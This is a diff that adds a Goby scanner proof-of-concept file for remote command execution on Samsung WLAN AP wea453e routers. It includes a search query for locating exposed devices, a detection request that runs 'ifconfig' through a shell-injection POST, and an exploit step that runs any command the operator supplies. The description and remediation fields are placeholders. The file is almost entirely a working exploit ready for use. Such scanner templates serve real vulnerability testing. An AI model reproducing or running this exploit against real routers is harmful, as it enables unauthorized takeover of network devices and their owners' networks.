@@ -1,0 +1,175 @@
+{
+
+​    "Name": "Samsung WLAN AP wea453e router RCE",
+
+​    "Level": "3",
+
+​    "Tags": [
+
+​        "rce",
+
+​        "getshell"
+
+​    ],
+
+​    "GobyQuery": "app=\"Chunjs-server\" && body=\"Samsung Electronics\"",
+
+​    "Description": "xxxx",
+
+​    "Product": "xxxxxx",
+
+​    "Homepage": "https://gobies.org/",
+
+​    "Author": "gobysec@gmail.com",
+
+​    "Impact": "<p>xxxx</p>",
+
+​    "Recommendation": "<p>xxxxx</p>",
+
+​    "References": [
+
+​        "https://gobies.org/"
+
+​    ],
+
+​    "HasExp": true,
+
+​    "ExpParams": [{
+
+​        "Name": "cmd",
+
+​        "Type": "input",
+
+​        "Value": "ls"
+
+​    }],
+
+​    "ExpTips": {
+
+​        "Type": "",
+
+​        "Content": ""
+
+​    },
+
+​    "ScanSteps": [
+
+​        "AND",
+
+​        {
+
+​            "Request": {
+
+​                "method": "POST",
+
+​                "uri": "/(download)/tmp/a.txt",
+
+​                "follow_redirect": true,
+
+​                "header": null,
+
+​                "data_type": "text",
+
+​                "data": "command1=shell:ifconfig| dd of=/tmp/a.txt",
+
+​                "set_variable": []
+
+​            },
+
+​            "ResponseTest": {
+
+​                "type": "group",
+
+​                "operation": "AND",
+
+​                "checks": [{
+
+​                        "type": "item",
+
+​                        "variable": "$code",
+
+​                        "operation": "==",
+
+​                        "value": "200",
+
+​                        "bz": ""
+
+​                    },
+
+​                    {
+
+​                        "type": "item",
+
+​                        "variable": "$body",
+
+​                        "operation": "contains",
+
+​                        "value": "eth0",
+
+​                        "bz": ""
+
+​                    }
+
+​                ]
+
+​            },
+
+​            "SetVariable": [
+
+​                "output|lastbody|regex|"
+
+​            ]
+
+​        }
+
+​    ],
+
+​    "ExploitSteps": [
+
+​        "AND",
+
+​        {
+
+​            "Request": {
+
+​                "method": "POST",
+
+​                "uri": "/(download)/tmp/a.txt",
+
+​                "follow_redirect": true,
+
+​                "header": null,
+
+​                "data_type": "text",
+
+​                "data": "command1=shell:{{{cmd}}} | dd of=/tmp/a.txt",
+
+​                "set_variable": []
+
+​            },
+
+​            "ResponseTest": {
+
+​                "type": "group",
+
+​                "operation": "AND",
+
+​                "checks": []
+
+​            },
+
+​            "SetVariable": [
+
+​                "output|lastbody||"
+
+​            ]
+
+​        }
+
+​    ],
+
+​    "PostTime": "2021-11-26 19:12:54",
+
+​    "GobyVersion": "1.9.310"
+
+}
